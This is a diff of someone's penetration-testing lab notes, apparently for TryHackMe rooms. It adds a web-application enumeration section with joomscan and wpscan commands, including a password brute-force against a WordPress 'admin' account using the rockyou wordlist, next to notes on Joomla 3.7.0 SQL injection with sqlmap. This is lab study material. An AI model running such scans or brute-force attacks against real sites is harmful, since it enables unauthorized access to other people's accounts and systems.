@@ -335,7 +335,6 @@ Save this request into a text file.
 `--dump` attempts to outputs the entire database  
  
 **Joomla 3.7.0 Sql Injection**  
-joomscan  
 
 ```
 $ joomscan -u http://10.10.45.254/administrator      
@@ -366,7 +365,20 @@ sqlmap -u "http://10.10.30.43/index.php?option=com_fields&view=fields&layout=mod
 `-T`: What table to extract columns from  
 The script remains there, as with the tables-attack
 
+### WebApplication Enumelation  
+- Joomla  
+  Joomscan  
+  ```
+  $ joomscan -u http://10.10.45.254/administrator
+  ```
 
+- WordPress  
+  Wpscan  
+   ```
+    $ wpscan --url http://internal.thm/blog -e vp,
+    $ wpscan --url http://internal.thm/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
+
+    ```
 
 
 
